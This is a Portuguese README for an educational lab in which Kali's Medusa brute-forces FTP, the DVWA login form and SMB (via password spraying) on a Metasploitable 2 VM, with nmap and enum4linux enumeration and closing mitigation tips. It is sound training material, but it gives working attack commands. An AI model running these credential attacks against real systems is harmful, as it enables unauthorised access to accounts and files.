```markdown
# Desafio: Simulando Brute Force com Kali Linux e Medusa

![Status](https://img.shields.io/badge/status-em%20andamento-yellow)
![License](https://img.shields.io/badge/license-educational-blue)
![Kali Linux](https://img.shields.io/badge/Kali-Linux-blueviolet)
![VirtualBox](https://img.shields.io/badge/VirtualBox-VM-orange)
![Medusa](https://img.shields.io/badge/tool-Medusa-red)

## Descrição do desafio

Implementar, documentar e compartilhar um projeto prático utilizando **Kali Linux** e a ferramenta **Medusa**, em conjunto com ambientes vulneráveis (por exemplo, **Metasploitable 2** e **DVWA**), para simular cenários de ataque de força bruta e exercitar medidas de prevenção [attached_file:file:1].

Objetivos principais [attached_file:file:1]:

- Configurar o ambiente com duas VMs (Kali Linux e Metasploitable 2) no VirtualBox, em rede interna (host-only).
- Executar ataques simulados:
  - Força bruta em FTP.
  - Automação de tentativas em formulário web (DVWA).
  - Password spraying em SMB com enumeração de usuários.
- Documentar testes: wordlists simples, comandos utilizados, validação de acessos e recomendações de mitigação.

---

## Instalação e configuração do ambiente

### 1. Instalar o Oracle VirtualBox

Fazer o download e instalação da VM Oracle VirtualBox [attached_file:file:1]:

- Site oficial: https://www.virtualbox.org/

### 2. Download das VMs (Kali Linux e Metasploitable 2)

Baixar as imagens dos sistemas operacionais [attached_file:file:1]:

- **Kali Linux (VM oficial)**:  
  https://www.kali.org/get-kali/#kali-virtual-machines
- **Metasploitable 2**:  
  https://sourceforge.net/projects/metasploitable/files/Metasploitable2/

Após o download, descompactar os arquivos em uma pasta do computador [attached_file:file:1].

### 3. Importar as VMs no VirtualBox

No VirtualBox, utilizar as opções **Novo** ou **Open** [attached_file:file:1]:

- **Kali Linux**:
  - Clicar em **Open** e localizar o arquivo descompactado.
  - Selecionar o arquivo e clicar em **Abrir**.
  - O VirtualBox fará a importação e configuração automática [attached_file:file:1].

- **Metasploitable 2**:
  - Clicar em **Novo**.
  - Definir um nome, por exemplo: `Metasploitable`.
  - Em **OS**, selecionar: `Linux`.
  - Em **OS Distribution**, selecionar: `Ubuntu`.
  - Em **OS Version**, selecionar: `Ubuntu (64-bit)` [attached_file:file:1].
  - Em **Specific virtual hard disk**, selecionar: **Utilizar um disco rígido virtual existente**.
  - No seletor de discos, clicar em **Acrescentar**, localizar o arquivo `Metasploitable.vmdk` e selecionar **Abrir** [attached_file:file:1].

Tutoriais de apoio para importação e configuração [attached_file:file:1]:

- Kali Linux como VM no VirtualBox:  
  https://www.kali.org/docs/virtualization/install-virtualbox-guest-vm/
- Metasploitable no VirtualBox:  
  https://medium.com/cyber-collective/setting-up-metasploitable-in-virtualbox-on-kali-linux-1d5c3212f7f3

### 4. Configurar rede (host-only)

Após carregar as duas imagens no VirtualBox, ajustar as configurações de rede, caso necessário [attached_file:file:1]:

- Selecionar a VM **Kali Linux**.
- Clicar em **Configurações** → modo **Expert** → aba **Rede**.
- Em **Ligado a:** selecionar **Placa de rede exclusiva do hospedeiro (host-only)** [attached_file:file:1].

Repetir o mesmo procedimento para a VM **Metasploitable 2** [attached_file:file:1].

---

## Inicialização das VMs e acesso inicial

Iniciar as duas máquinas virtuais (Kali Linux e Metasploitable 2) no VirtualBox, preferencialmente ligando uma de cada vez [attached_file:file:1].

Credenciais padrão [attached_file:file:1]:

- **Kali Linux**  
  - Usuário: `kali`  
  - Senha: `kali`
- **Metasploitable 2**  
  - Usuário: `msfadmin`  
  - Senha: `msfadmin`

### Dica: Layout de teclado ABNT2

Se houver problema com o layout de teclado (ABNT2 PT-BR), utilizar no terminal (Kali ou Metasploitable) [attached_file:file:1]:

```

setxkbmap -model abnt2 -layout br

```

---

## Verificando conectividade entre as VMs

### Passo 1 – Obter IP do Metasploitable

No terminal do **Metasploitable**, executar [attached_file:file:1]:

```

ip a

```

Anotar o endereço IP exibido em `eth0 – inet`, por exemplo: `192.168.56.101` [attached_file:file:1].

### Passo 2 – Testar ping a partir do Kali

No **Kali Linux**, abrir um terminal e executar [attached_file:file:1]:

```

ping -c 3 192.168.56.101

```

Se o ping responder, as duas máquinas estão se comunicando corretamente na rede host-only [attached_file:file:1].

---

## Fase 1 – Enumeração de serviços com Nmap

No Kali Linux, limpar o terminal com `clear` ou abrir um novo terminal [attached_file:file:1].

Executar o scan Nmap na máquina Metasploitable para portas específicas [attached_file:file:1]:

```

nmap -sV -p 21,22,80,445,139 192.168.56.101

```

Esse comando verifica quais serviços estão abertos nessas portas e quais versões estão em execução [attached_file:file:1].

A partir do resultado, é possível identificar, por exemplo, que o serviço **FTP** está rodando na porta `21`, o que será o foco da fase seguinte [attached_file:file:1].

---

## Fase 2 – Ataque de força bruta a FTP com Medusa

### Teste inicial de conexão FTP

No Kali Linux, tentar conexão FTP direta [attached_file:file:1]:

```

ftp 192.168.56.101

```

O sistema solicitará usuário e senha que ainda não são conhecidos; ao usar credenciais erradas, será retornado erro de login incorreto [attached_file:file:1].

Para encerrar a tentativa de conexão [attached_file:file:1]:

```

quit

```

### Criação de wordlists (usuários e senhas)

Criar lista de usuários no Kali Linux [attached_file:file:1]:

```

echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

```

Criar lista de senhas no Kali Linux [attached_file:file:1]:

```

echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

```

### Ataque de brute force em FTP com Medusa

Executar o Medusa com as wordlists criadas [attached_file:file:1]:

```

medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6

```

O resultado indicará combinação válida de usuário e senha, por exemplo `msfadmin:msfadmin`, com acesso ao serviço de FTP [attached_file:file:1].

### Conexão FTP com credenciais descobertas

No Kali Linux, reconectar ao FTP usando as credenciais válidas [attached_file:file:1]:

```

ftp 192.168.56.101

```

Quando solicitado, utilizar [attached_file:file:1]:

- Usuário: `msfadmin`  
  - Senha: `msfadmin`

A partir desse momento, há acesso ao computador remoto via FTP, com possibilidade de listar diretórios, efetuar download e upload de arquivos [attached_file:file:1].

---

## Fase 3 – Ataque de brute force em formulário web (DVWA)

Nesta fase, é utilizado o **Kali Linux** e a aplicação vulnerável **DVWA** hospedada no Metasploitable para demonstrar ataques de força bruta em formulários web [attached_file:file:1].

### Acesso ao DVWA

No navegador Firefox do Kali Linux, acessar [attached_file:file:1]:

```

http://192.168.56.101/dvwa/login.php

```

### Uso do modo desenvolvedor

- No Firefox, clicar com o botão direito em qualquer área da página e selecionar **Inspect**.
- Selecionar a aba **Network** [attached_file:file:1].
- Tentar login com qualquer usuário/senha.
- Observar que aparece a mensagem `LOGIN FAILED` abaixo do botão de login [attached_file:file:1].
- Na aba **Network**, será possível visualizar as requisições **POST** e **GET** disparadas.
- Ao clicar no método **POST**, na aba **REQUEST** podem ser vistas as informações enviadas no login (campos do formulário, parâmetros etc.) [attached_file:file:1].

Essas informações serão necessárias para parametrizar o Medusa para o ataque web [attached_file:file:1].

### Ataque com Medusa utilizando DVWA

Aproveitar as wordlists `users.txt` e `pass.txt` criadas anteriormente [attached_file:file:1].

No terminal do Kali Linux, executar [attached_file:file:1]:

```

medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^\&password=^PASS^\&Login=Login' \
-m 'FAIL=Login failed' -t 6

```

Esse comando realiza tentativas automatizadas de login no formulário DVWA, com base em combinações de usuários e senhas das wordlists [attached_file:file:1].

O resultado indicará quais pares de usuário/senha conseguem autenticar com sucesso no site [attached_file:file:1].

### Login manual com credenciais válidas

Após identificar um par válido, retornar ao navegador e efetuar login no DVWA usando uma das combinações encontradas [attached_file:file:1].

A partir desse momento, o atacante passa a ter acesso à área autenticada/administrativa do site, podendo explorar novas vulnerabilidades [attached_file:file:1].

---

## Fase 4 – Ataque em cadeia: enumeração SMB e password spraying

Nesta fase, é explorado o serviço **SMB** no Metasploitable, combinando enumeração de usuários com **enum4linux** e técnica de **password spraying** usando o Medusa [attached_file:file:1].

### Enumeração SMB com enum4linux

No terminal do Kali Linux, executar [attached_file:file:1]:

```

enum4linux -a 192.168.56.101 | tee enum4_output.txt

```

- `enum4linux` é uma ferramenta de segurança usada para enumerar informações em sistemas Windows e Samba via protocolo SMB [attached_file:file:1].
- O comando acima salva a saída em `enum4_output.txt` [attached_file:file:1].

Para visualizar o conteúdo do arquivo [attached_file:file:1]:

```

less enum4_output.txt

```

Para sair do `less`, utilizar `CTRL+C` ou `CTRL+Z` [attached_file:file:1].

### Criação de wordlists específicas para SMB

Criar wordlist de usuários SMB [attached_file:file:1]:

```

echo -e "user\nmsfadmin\nservice" > smb_users.txt

```

Criar wordlist de senhas para password spraying [attached_file:file:1]:

```

echo -e "password\n123456\nWelcome12\nmsfadmin" > senhas_spray.txt

```

### Password spraying em SMB com Medusa

Executar o Medusa para testar combinações de usuários e senhas no serviço SMB [attached_file:file:1]:

```

medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

```

O resultado indicará credenciais válidas para o SMB, por exemplo `msfadmin:msfadmin` [attached_file:file:1].

### Teste de acesso SMB com smbclient

No terminal do Kali Linux, testar o acesso SMB com as credenciais encontradas [attached_file:file:1]:

```

smbclient -L //192.168.56.101 -U msfadmin

```

Se o acesso for bem-sucedido, o atacante poderá listar compartilhamentos e potencialmente acessar arquivos compartilhados via SMB [attached_file:file:1].

---

## Boas práticas de prevenção

Para mitigar ataques de brute force, password spraying e exploração de serviços vulneráveis, recomendam-se as seguintes medidas [attached_file:file:1]:

- Uso de **autenticação de múltiplos fatores (MFA)**.
- Uso de **senhas fortes**, longas e complexas, com **expiração periódica**.
- **Bloqueio de endereços IP** após múltiplas tentativas de login fracassadas.
- **Monitoramento de logs** de autenticação e de eventos suspeitos.
- **Segmentação de rede** para reduzir a superfície de ataque.
- **Desativação de serviços desnecessários** (como FTP, SMB inseguros, etc.).
- **Atualização constante de patches** de sistema operacional e serviços expostos [attached_file:file:1].
```
